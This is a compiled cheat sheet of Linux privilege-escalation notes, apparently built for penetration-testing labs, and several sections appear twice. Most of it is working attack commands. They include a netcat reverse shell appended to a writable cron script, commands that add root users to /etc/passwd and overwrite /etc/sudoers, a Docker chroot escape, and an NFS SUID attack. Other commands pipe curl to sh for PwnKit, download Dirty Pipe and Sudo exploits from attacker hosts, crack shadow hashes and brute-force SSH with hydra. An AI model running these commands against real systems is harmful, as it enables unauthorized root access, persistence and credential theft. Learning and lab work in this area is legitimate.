## Privilege Escalation Linux Checklist

> Source: `01101100-C0D3X-00110110.md` → `Detailed Checklists > Privilege Escalation Linux Checklist`

1. Get history (good for attacks and local on my Kali)
```bash
history 0 | grep <command>
```
1. Run LinPEAS and look for low-hanging fruit.
2. Check for red text on a yellow background.
3. List screen sessions:

```bash
screen -list
```

4. List tmux panes:

```bash
tmux list-panes
```

5. Attempt `sudo -i`.
6. Get hostname and OS version.
7. Check CPU architecture:

```bash
lscpu
```

8. Review user activity:

```bash
w
last
lastlog
```

9. Inspect autostart entries and scheduled tasks.
10. Check uptime:

```bash
uptime -p
```

11. List cron jobs:

```bash
crontab -l
sudo crontab -l
ls -la /etc/cron.daily
```

12. Examine shell configurations.
13. Check environment variables and bash configurations.
14. Review permissions.
15. Attempt `sudo -i` with known passwords.
16. Check `sudo` version:

```bash
sudo -V
```

17. Inspect `/etc/passwd` and `/etc/shadow`.
18. Find SUID/SGID files:

```bash
find / -perm /4000 2>/dev/null
```

19. Find world-writable directories and files:

```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

20. Check `sudo` privileges:

```bash
sudo -l
```

21. Find files with capabilities:

```bash
getcap -r / 2>/dev/null
```

22. Check for unmounted drives.
23. Review command history.
24. Enumerate users and groups.
25. Check group memberships:

```bash
getent groups
```

26. Inspect important configuration files.
27. Examine SSH configurations.
28. Look for password files.
29. Check temporary directories.
30. Inspect network configurations.
31. List open ports:

```bash
netstat -tuepn
netstat -tulpn
```

32. Check firewall rules.
33. Use `tcpdump` to listen on interfaces.
34. Look for common CVEs.
35. List running processes:

```bash
ps aux
```

36. Use `pspy` to monitor processes:

```bash
timeout 20 ./pspy64
```

37. Check for Docker configurations.
38. Find recent files and directories.
39. Search for Git repositories:

```bash
find / -type d -name ".git"
```

40. Run LinPEAS for comprehensive enumeration:

```bash
timeout 5m ./linpeas.sh
```

41. Reference [HackTricks Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation).
42. Repeat enumeration steps—**Enumeration is key; try harder.**
43. Verify all findings and ensure no steps were missed.


## Docker

> Source: `01101100-C0D3X-00110110.md` → `Enumeration > Service Enumeration > Docker`

```bash
docker ps -a
docker exec -it <container_id> /bin/bash
```

## 🐧 Linux (Bash)

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Check Permissions! > 🐧 Linux (Bash)`

Find configuration files:

```bash
find /path/to/search -type f \( -iname "*.cfg" -o -iname "*.conf" -o -iname "*.config" -o -iname "*.ini" -o -iname "*.xml" -o -iname "*.json" -o -iname "*.yaml" -o -iname "*.yml" -o -iname "*.toml" -o -iname "*.properties" -o -iname "*.env" -o -iname "*.txt" \)
```

Search from the current directory:

```bash
find . -type f \( -iname "*.cfg" -o -iname "*.conf" -o -iname "*.config" -o -iname "*.ini" -o -iname "*.xml" -o -iname "*.json" -o -iname "*.yaml" -o -iname "*.yml" -o -iname "*.toml" -o -iname "*.properties" -o -iname "*.env" -o -iname "*.txt" \)
```


## SUID Binaries:

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Check Permissions! > Linux Privilege Escalation Checklist > SUID Binaries:`

```bash
find / -perm -4000 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
```


## Running Processes:

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Check Permissions! > Linux Privilege Escalation Checklist > Running Processes:`

```bash
ps aux | grep root
```


## Kernel Exploits:

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Check Permissions! > Linux Privilege Escalation Checklist > Kernel Exploits:`

- Search for kernel exploits using `searchsploit linux kernel <version>` and Google Dork (e.g., dirtycow, dirtypipe).


## SSH Keys:

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Check Permissions! > **Exploitation** > SSH Keys:`

```bash
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null

id_ecdsa

id_dsa

then crack em with hashcat
```


## Capabilities:

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Check Permissions! > **Exploitation** > Capabilities:`

```bash
getcap -r / 2>/dev/null
```

Example exploiting python capability:

```bash
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```


## NFSRootSquashing:

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Check Permissions! > **Exploitation** > NFSRootSquashing:`

```bash
cat /etc/exports
```

- If `"no_root_squash"` is defined, exploit the vulnerability.


## Docker:

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Check Permissions! > **Exploitation** > Docker:`

```bash
find / -name docker.sock 2>/dev/null
docker images
docker run -v /:/mnt --rm -it <image_name> chroot /mnt sh
```

## Manual Basic Enumeration & Enumerating Linux

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Check Permissions! > Linux Privilege Escalation Checklist > Manual Basic Enumeration & Enumerating Linux`

- Check user and group information:
```bash
whoami && id

ss -tulnp

	nc <IP> <port> # port from ss
```

- Examine the `/etc/passwd` file:
```bash
cat /etc/passwd
```

- If `/etc/passwd` is writable:
    - Generate a new password hash:

```bash
openssl passwd w00t
```

- Add a new root user:

```bash
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

- Switch to the new user:

```bash
su root2
```

- Get kernel and OS information:

```bash
uname -a && cat /etc/issue

cat /etc/os-release
```

- Check the hostname:

```bash
hostname
```

- List sudo privileges:

```bash
sudo -l
```

- **LD_PRELOAD:** Compile a payload in C and call it using sudo.
- List running processes:

```bash
ps aux
```

- Monitor processes for passwords:

```bash
watch -n 1 "ps -aux | grep pass"
```
    
- Capture local network traffic for passwords:

```bash
sudo tcpdump -i lo -A | grep "pass"
sudo tcpdump -i any "icmp"  # confirm RCE exploit works or any network traffic
```

- Check network interfaces:

```bash
ip a
```

- Display routing table:

```bash
route

routel
```

- List listening network connections:

```bash
ss -anp
```

- Examine firewall rules:

```bash
cat /etc/iptables/rules.v4
```
 
- List cron jobs:

```bash
ls -lah /etc/cron*

sudo crontab -l
```

- Check cron logs:

```bash
grep "CRON" /var/log/syslog

tail /var/log/cron.log
```
- See linpeas output, check for writable scripts that may be running and visible in ONLY this log.
- List installed packages:

```bash
dpkg -l
```

- Find writable directories:

```bash
find / -writable -type d 2>/dev/null
```

- Find SUID & GUID files:

```bash
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null

find / -perm -g=s -type f 2>/dev/null
```
- Some SUID privesc may need debugging.
- Check file capabilities:

```bash
getcap -r / 2>/dev/null

/usr/sbin/getcap
```
 
- Examine `/etc/fstab`:

```bash
cat /etc/fstab
```

- List mounted filesystems:

```bash
mount
```

- List block devices:

```bash
lsblk
```

- List loaded kernel modules:

```bash
lsmod
```

- Get module information:

```bash
/sbin/modinfo libata
```

    - `libata` replaced with interesting driver/kernel modules found with `lsmod`.
- Check environment variables:

```bash
env
```

- Examine `.bashrc`:

```bash
cat .bashrc
```

- If hardcoded passwords are found in `env` or `.bashrc`, you can try to crack other user's passwords. Example for cracking 'eve's' password if 'lab' with variations is a known password for 'joe':

```bash
crunch 6 6 -t Lab%%% > wordlist
    hydra -l eve -P wordlist 192.168.50.214 -t 4 ssh -V
```


## Linux Enumeration Scripts:

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Check Permissions! > Linux Privilege Escalation Checklist > Linux Enumeration Scripts:`

- **linPEAS:**

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

- **linux-exploit-suggester** (second option)
- **LinEnum.sh:**

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh
```
    
- **linuxprivchecker**
- **unix-privesc-check**


## Stored Passwords:

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Check Permissions! > Linux Privilege Escalation Checklist > Stored Passwords:`

```bash
cat ~/.bash_history | grep -i passw
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
ls -la /etc/shadow
```


## **Exploitation**

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Check Permissions! > **Exploitation**`

Linux VM

1. In command prompt type: **cat /etc/passwd**
2. Save the output to a file on your attacker machine
3. In command prompt type: **cat /etc/shadow** 4. Save the output to a file on your attacker machine

Attacker VM

1\. In command prompt type: `unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt`

Now, you have an unshadowed file.  We already know the password, but you can use your favorite hash cracking tool to crack dem hashes.  For example:

`hashcat -m 1800 unshadowed.txt rockyou.txt -O`


## Crontab:

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Check Permissions! > **Exploitation** > Crontab:`

```bash
cat /etc/crontab
crontab -l
sudo crontab -l
tail /var/log/cron.log
```

- See linpeas output, check for writable scripts that may be running and visible in ONLY this log.
- Try to inject commands:
    - In the path
    - In the wildcard
    - Or overwrite/edit the file being called.
- Example: If `user_backups.sh` is world-writable and scheduled to run every minute, add a reverse shell command to the end of it:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
```


## Manual Basic Enumeration & Enumerating Linux

> Source: `01101100-RUN3-00110110.md` → `PrivEsc > Check Permissions! > Linux Privilege Escalation Checklist > Manual Basic Enumeration & Enumerating Linux`

- Check user and group information:
```bash
whoami && id

ss -tulnp

	nc <IP> <port> # port from ss
```

- Examine the `/etc/passwd` file:
```bash
cat /etc/passwd
```

- If `/etc/passwd` is writable:
    - Generate a new password hash:

```bash
openssl passwd w00t
```

- Add a new root user:

```bash
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

- Switch to the new user:

```bash
su root2
```

- Get kernel and OS information:

```bash
uname -a && cat /etc/issue

cat /etc/os-release
```

- Check the hostname:

```bash
hostname
```

- List sudo privileges:

```bash
sudo -l
```

- **LD_PRELOAD:** Compile a payload in C and call it using sudo.
- List running processes:

```bash
ps aux
```

- Monitor processes for passwords:

```bash
watch -n 1 "ps -aux | grep pass"
```
    
- Capture local network traffic for passwords:

```bash
sudo tcpdump -i lo -A | grep "pass"
```

- Check network interfaces:

```bash
ip a
```

- Display routing table:

```bash
route

routel
```

- List listening network connections:

```bash
ss -anp
```

- Examine firewall rules:

```bash
cat /etc/iptables/rules.v4
```
 
- List cron jobs:

```bash
ls -lah /etc/cron*

sudo crontab -l
```

- Check cron logs:

```bash
grep "CRON" /var/log/syslog

tail /var/log/cron.log
```
- See linpeas output, check for writable scripts that may be running and visible in ONLY this log.
- List installed packages:

```bash
dpkg -l
```

- Find writable directories:

```bash
find / -writable -type d 2>/dev/null
```

- Find SUID files:

```bash
find / -perm -u=s -type f 2>/dev/null

find / -type f -perm -04000 -ls 2>/dev/null
```
- Some SUID privesc may need debugging.
- Check file capabilities:

```bash
getcap -r / 2>/dev/null

/usr/sbin/getcap
```
 
- Examine `/etc/fstab`:

```bash
cat /etc/fstab
```

- List mounted filesystems:

```bash
mount
```

- List block devices:

```bash
lsblk
```

- List loaded kernel modules:

```bash
lsmod
```

- Get module information:

```bash
/sbin/modinfo libata
```

    - `libata` replaced with interesting driver/kernel modules found with `lsmod`.
- Check environment variables:

```bash
env
```

- Examine `.bashrc`:

```bash
cat .bashrc
```

- If hardcoded passwords are found in `env` or `.bashrc`, you can try to crack other user's passwords. Example for cracking 'eve's' password if 'lab' with variations is a known password for 'joe':

```bash
crunch 6 6 -t Lab%%% > wordlist
    hydra -l eve -P wordlist 192.168.50.214 -t 4 ssh -V
```


---
## Linux libraries

> Source: `01101100-C0D3X-00110110.md` → `AD > Linux libraries`

---

Compile lib LD\_LIBRARY\_PATH

```shell
gcc -Wall -fPIC -c -o hax.o hax.c
gcc -shared -o libhax.so hax.o
```

with map

```shell
gcc -Wall -fPIC -c -o hax.o hax.c
gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o
```

Compile lib LD\_PRELOAD

```shell
gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o preload.c
gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl
export LD_PRELOAD=/home/offsec/evil_geteuid.so
cp /etc/passwd /tmp/testpasswd
```

Add to .bashrc

```shell
alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib"
```

View loaded libs

Get symbols

```shell
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```

Create version map

```shell
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```

---

## Privilege Escalation Linux Checklist

> Source: `01101100-RUN3-00110110.md` → `LAPSToolkit > Detailed Checklists > Privilege Escalation Linux Checklist`

1. Run LinPEAS and look for low-hanging fruit.
2. Check for red text on a yellow background.
3. List screen sessions:

```bash
screen -list
```

4. List tmux panes:

```bash
tmux list-panes
```

5. Attempt `sudo -i`.
6. Get hostname and OS version.
7. Check CPU architecture:

```bash
lscpu
```

8. Review user activity:

```bash
w
last
lastlog
```

9. Inspect autostart entries and scheduled tasks.
10. Check uptime:

```bash
uptime -p
```

11. List cron jobs:

```bash
crontab -l
sudo crontab -l
ls -la /etc/cron.daily
```

12. Examine shell configurations.
13. Check environment variables and bash configurations.
14. Review permissions.
15. Attempt `sudo -i` with known passwords.
16. Check `sudo` version:

```bash
sudo -V
```

17. Inspect `/etc/passwd` and `/etc/shadow`.
18. Find SUID/SGID files:

```bash
find / -perm /4000 2>/dev/null
```

19. Find world-writable directories and files:

```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

20. Check `sudo` privileges:

```bash
sudo -l
```

21. Find files with capabilities:

```bash
getcap -r / 2>/dev/null
```

22. Check for unmounted drives.
23. Review command history.
24. Enumerate users and groups.
25. Check group memberships:

```bash
getent groups
```

26. Inspect important configuration files.
27. Examine SSH configurations.
28. Look for password files.
29. Check temporary directories.
30. Inspect network configurations.
31. List open ports:

```bash
netstat -tuepn
netstat -tulpn
```

32. Check firewall rules.
33. Use `tcpdump` to listen on interfaces.
34. Look for common CVEs.
35. List running processes:

```bash
ps aux
```

36. Use `pspy` to monitor processes:

```bash
timeout 20 ./pspy64
```

37. Check for Docker configurations.
38. Find recent files and directories.
39. Search for Git repositories:

```bash
find / -type d -name ".git"
```

40. Run LinPEAS for comprehensive enumeration:

```bash
timeout 5m ./linpeas.sh
```

41. Reference [HackTricks Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation).
42. Repeat enumeration steps—**Enumeration is key; try harder.**
43. Verify all findings and ensure no steps were missed.

---

g0tmilk's Guide to Linux Privilege Escalation as well:
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

I just got a low-priv shell ! What would S1REN do?
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
OR
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```

S1REN would say:
Various Capabilities?
```bash
which gcc
which cc
which python
which perl
which wget
which curl
which fetch
which nc
which ncat
which nc.traditional
which socat
```

Compilation? (Very Back Burner)
```bash
file /bin/bash
uname -a
cat /etc/*-release
cat /etc/issue
```


What Arch?
```bash
file /bin/bash
```

Kernel?
```bash
uname -a
```

Issue/Release?
```bash
cat /etc/issue
cat /etc/*-release
```

Are we a real user?
```bash
sudo -l
ls -lsaht /etc/sudoers
```

Are any users a member of exotic groups?
```bash
groups <user>
```


Check out your shell's environment variables...
```bash
env
```
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/

Users?
```bash
cd /home/
ls -lsaht
```

Web Configs containing credentials?
```bash
cd /var/www/html/
ls -lsaht
```

SUID Binaries?
```bash
find / -perm -u=s -type f 2>/dev/null
```

GUID Binaries?
```bash
find / -perm -g=s -type f 2>/dev/null
```

SUID/GUID/SUDO Escalation:
https://gtfobins.github.io/

Binary/Languages with "Effective Permitted" or "Empty Capability" (ep):
https://www.insecure.ws/linux/getcap_setcap.html#getcap-setcap-and-file-capabilities
Get Granted/Implicit (Required by a Real User) Capabilities of all files recursively throughout the system and pipe all error messages to /dev/null.
```bash
getcap -r / 2>/dev/null
```


We need to start monitoring the system if possible while performing our enumeration...
In other words:
"S1REN... Is privilege escalation going to come from some I/O file operations being done by some script on the system?"
https://github.com/DominicBreuker/pspy/blob/master/README.md
```bash
cd /var/tmp/
File Transfer --> pspy32
File Transfer --> pspy64
chmod 755 pspy32 pspy64
./pspy<32/64>
```

What does the local network look like?
```bash
netstat -antup
netstat -tunlp
```

Is anything vulnerable running as root?
```bash
ps aux |grep -i 'root' --color=auto
```

MYSQL Credentials? Root Unauthorized Access?
```bash
mysql -uroot -p
Enter Password:
root : root
root : toor
root :
```
- MySQL Exploit
	- mysql Ver 14.14 Distrib 5.7.30, for Linux (x86_64) 
	- https://www.exploit-db.com/exploits/50236
	- https://github.com/d7x/udf_root/blob/master/udf_root.py

S1REN would take a quick look at etc to see if any user-level people did special things:
```bash
cd /etc/
ls -lsaht
```
Anything other than root here?
• Any config files left behind?
```bash
ls -lsaht |grep -i ‘.conf’ --color=auto
```

• If we have root priv information disclosure - are there any .secret in /etc/ files?
```bash
ls -lsaht |grep -i ‘.secret’ --color=aut
```

SSH Keys I can use perhaps for even further compromise?
```bash
ls -lsaR /home/
```

Quick look in:
```bash
ls -lsaht /var/lib/
ls -lsaht /var/db/
```

Quick look in:
```bash
ls -lsaht /opt/
ls -lsaht /tmp/
ls -lsaht /var/tmp/
ls -lsaht /dev/shm/
```

File Transfer Capability? What can I use to transfer files?
```bash
which wget
which curl
which nc
which fetch (BSD)
ls -lsaht /bin/ |grep -i 'ftp' --color=auto
```

NFS? Can we exploit weak NFS Permissions?
```bash
cat /etc/exports
```
no_root_squash?
https://recipeforroot.com/attacking-nfs-shares/
```bash
# On attacking machine
mkdir -p /mnt/nfs/
mount -t nfs -o vers=<version 1,2,3> $IP:<NFS Share> /mnt/nfs/ -nolock
gcc suid.c -o suid
cp suid /mnt/nfs/
chmod u+s /mnt/nfs/suid
su <user id matching target machine's user-level privilege.>

# On target machine
user@host$ ./suid
#
```

Where can I live on this machine? Where can I read, write and execute files?
```bash
/var/tmp/
/tmp/
/dev/shm/
```

Any exotic file system mounts/extended attributes?
```bash
cat /etc/fstab
```

Forwarding out a weak service for root priv (with meterpreter!):
Do we need to get a meterpreter shell and forward out some ports that might be running off of the Loopback Adaptor (127.0.0.1) and forward them to any (0.0.0.0)? If I see something like Samba SMBD out of date on 127.0.0.1 - we should look to forward out the port and then run trans2open on our own machine at the forwarded port.
https://www.offensive-security.com/metasploit-unleashed/portfwd/
Forwarding out netbios-ssn EXAMPLE:
```bash
meterpreter> portfwd add –l 139 –p 139 –r [target remote host]
meterpreter> background
use exploit/linux/samba/trans2open
set RHOSTS 0.0.0.0
set RPORT 139
run
```

Can we write as a low-privileged user to /etc/passwd?
```bash
openssl passwd -1
i<3hacking
$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.
echo 'siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash' >> /etc/passwd
su siren
id
```

Cron.
```bash
crontab –u root –l
```

Look for unusual system-wide cron jobs:
```bash
cat /etc/crontab
ls /etc/cron.*
```

Bob is a user on this machine. What is every single file he has ever created?
```bash
find / -user miguel 2>/dev/null
```

Any mail? mbox in User $HOME directory?
```bash
cd /var/mail/
ls -lsaht
```

Linpease:
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

Traitor:
https://github.com/liamg/traitor

GTFOBins:
https://gtfobins.github.io/

PSpy32/Pspy64:
https://github.com/DominicBreuker/pspy/blob/master/README.md

---

## Exploits

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Linux > Exploits`

💡 Try the suggested linpeas exploit. Could maybe use one of those:

Sudo Baron Samedit (Sudo <1.9.5p2)

```
wget http://192.168.45.218/SudoBaron/exploit_nss.py
python3 exploit_nss.py
```

[https://github.com/worawit/CVE-2021-3156](https://github.com/worawit/CVE-2021-3156)

PwnKit (SUID pkexec)

```
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```

[https://github.com/ly4k/PwnKit](https://github.com/ly4k/PwnKit)

DirtyCow (Linux kernel <4.8.3)

[https://github.com/dirtycow/dirtycow.github.io](https://github.com/dirtycow/dirtycow.github.io)

Dirty pipe (Linux kernel >5.8)

```
wget http://192.168.49.136/DirtyPipe/compile.sh
wget http://192.168.49.136/DirtyPipe/exploit-1.c
wget http://192.168.49.136/DirtyPipe/exploit-2.c
chmod +x compile.sh
./compile.sh
./exploit-1
# or
./exploit-2
```

[GitHub - AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits: A collection of exploits and documentation that can be used to exploit the Linux Dirty Pipe vulnerability.](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/tree/main)

Polkit (version >0.113)

[https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation)

```
echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers
```
```
openssl passwd 123
root2:{HASH}:0:0:root:/root:/bin/bash
```

[Writable /etc/passwd → Root](https://www.notion.so/Writable-etc-passwd-Root-7b5d52c6cf954cc79a13813a525c68e8?pvs=21)

